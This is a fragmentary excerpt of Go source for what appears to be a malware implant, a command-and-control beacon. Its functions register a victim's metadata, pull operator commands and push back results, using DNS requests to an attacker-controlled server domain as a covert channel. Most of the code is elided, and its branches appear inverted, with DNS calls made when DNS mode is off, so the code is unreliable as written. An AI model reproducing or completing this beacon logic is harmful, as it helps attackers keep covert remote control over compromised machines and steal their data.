...
func MakePacket(replyType int, b []byte) []byte {
	...
	// DNS will send packet length in DNSPost
	if !config.IsDNS {
...
func MakeMetaInfo() []byte {
	...
	if config.IsDNS {
		baseDomain = strconv.FormatInt(int64(clientID), 16) + config.ServerBaseDomain
		util.Printf("DNS base domain: %s\n", baseDomain)
	}
...
func FirstBlood() bool {
	...
	for i := 0; i < config.MaxRetries; i++ {
		...
		if !config.IsDNS {
			...
			_, err = DnsGet(encryptedMetaInfo)
		}
		if err != nil {
			util.Sleep()
			util.Printf("FirstBlood error: %v\n", err)
			continue
		}
...
func PullCommand() ([]byte, error) {
	...
	if !config.IsDNS {
		...
		resp, err = DnsGet(encryptedMetaInfo)
	}
	if err != nil {
...
func PushResult(callBack int, b []byte) {
	...
	if !config.IsDNS {
		...
		DNSPost(finalPacket, config.PostResultPrefix)
	}
}
